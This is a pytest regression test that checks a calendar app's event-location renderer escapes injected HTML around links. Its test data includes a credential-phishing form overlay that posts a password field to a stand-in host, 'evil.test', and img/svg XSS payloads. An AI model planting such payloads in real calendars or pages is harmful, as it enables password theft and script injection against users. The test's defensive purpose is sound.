# SPDX-License-Identifier: AGPL-3.0-or-later
"""`B1905`. An event location with a link in it drew the words around the link as markup.

`_locHTML` in `static/js/calendar.js` draws an event's location in the day
view, the agenda and the search results, and what it returns goes into the
page through `innerHTML`. When the location held an http(s) address, only the
address was escaped; every other character went out as it was. A location is
written by other people: a shared or team calendar synced over CalDAV, an
invitation the provider files onto one, an imported .ics file, the
email-to-calendar pass. So `Room 4 <form ...> https://zoom.us/j/1` drew a
working form on Pantheon's own page. The page's CSP stops injected script,
not a form that posts to another host, a style over the whole app, or a link.
An address written in angle brackets, the way mail clients write one, also
took the closing `>` into its link.

Now the text around and between the links is escaped too, each link is still
a link to its own address, and a line break is still a line break. A location
with no link is drawn as before: one OpenStreetMap link around the escaped
text.

Ported from upstream Odysseus 218d7624 (its `_locHTML` rewrite and its case).
Driven under node: the shipped `_e` and `_locHTML`, cut out of calendar.js
with `tests/helpers/js_source.js_function`, with the shipped escaper (`B874`),
and the result read back with `html.parser`.
"""
from __future__ import annotations

import json
import shutil
import subprocess
from html.parser import HTMLParser
from pathlib import Path

import pytest

from tests.helpers.esc_stub import esc_source
from tests.helpers.js_source import js_function

ROOT = Path(__file__).resolve().parents[1]
CALENDAR_JS = ROOT / "static" / "js" / "calendar.js"

pytestmark = pytest.mark.skipif(not shutil.which("node"), reason="node binary not on PATH")

FORM = ('Room 4 <form action="//evil.test/c" method="post" '
        'style="position:fixed;inset:0;z-index:2147483647;background:#fff">'
        '<p>Your Pantheon session expired.</p><input name="pw" type="password">'
        '<button>Sign in</button></form> https://zoom.us/j/1')
IMG = '<img src=x onerror=alert(1)> https://example.test/meeting <svg onload=alert(2)>'


def _drawn(*locations):
    """`_locHTML` of each location, as calendar.js ships it."""
    src = CALENDAR_JS.read_text(encoding="utf-8")
    script = (
        esc_source()
        + "const uiModule = { esc };\n"
        + "function _e(s) " + js_function(src, "function _e(") + "\n"
        + "function _locHTML(loc) " + js_function(src, "function _locHTML(") + "\n"
        + "console.log(JSON.stringify(%s.map((loc) => _locHTML(loc))));\n" % json.dumps(list(locations))
    )
    done = subprocess.run(["node", "--input-type=module", "-e", script],
                          cwd=str(ROOT), capture_output=True, text=True, timeout=30)
    assert done.returncode == 0, done.stderr
    return json.loads(done.stdout.strip().splitlines()[-1])


class _Page(HTMLParser):
    """What a browser makes of the HTML: its tags, its links, its words."""

    def __init__(self, html):
        super().__init__(convert_charrefs=True)
        self.tags, self.hrefs, self._text = [], [], []
        self.feed(html)
        self.close()

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        if tag == "br":
            self._text.append("\n")
        if tag == "a":
            self.hrefs.append(dict(attrs).get("href"))

    def handle_data(self, data):
        self._text.append(data)

    @property
    def text(self):
        return "".join(self._text)


def test_a_location_reads_as_written_with_or_without_a_link():
    img, form, lines, plain = _drawn(IMG, FORM, "Room 4\n<b>East</b> https://zoom.us/j/1",
                                     "Room 4 & Co <b>East</b>")

    # Upstream's case, as upstream asserts it.
    assert "<img" not in img and "<svg" not in img
    assert "&lt;img" in img
    assert 'href="https://example.test/meeting"' in img

    for html, location in ((img, IMG), (form, FORM)):
        page = _Page(html)
        assert page.tags == ["a"], html
        assert page.text == location
    assert _Page(form).hrefs == ["https://zoom.us/j/1"]

    page = _Page(lines)
    assert page.tags == ["br", "a"], lines
    assert page.text == "Room 4\n<b>East</b> https://zoom.us/j/1"

    # No link: the whole location opens the map, escaped, as before.
    page = _Page(plain)
    assert page.tags == ["a"]
    assert page.hrefs == ["https://www.openstreetmap.org/search?query=Room%204%20%26%20Co%20%3Cb%3EEast%3C%2Fb%3E"]
    assert page.text == "Room 4 & Co <b>East</b>"
    assert "&amp;" in plain


def test_every_link_in_a_location_stays_a_link_to_its_own_address():
    alone, query, two = _drawn("https://zoom.us/j/1", "https://zoom.us/j/1?a=1&b=2",
                               "See <https://a.test/1> and https://b.test/2")

    # One address on its own is one link. A rewrite that walks the matches
    # after `urlRe.test()` without resetting `lastIndex` loses this one.
    assert _Page(alone).hrefs == ["https://zoom.us/j/1"]
    assert alone.count("<a ") == 1
    assert _Page(query).hrefs == ["https://zoom.us/j/1?a=1&b=2"]
    assert "?a=1&amp;b=2" in query

    page = _Page(two)
    assert page.hrefs == ["https://a.test/1", "https://b.test/2"]
    assert page.tags == ["a", "a"]
    assert page.text == "See <https://a.test/1> and https://b.test/2"
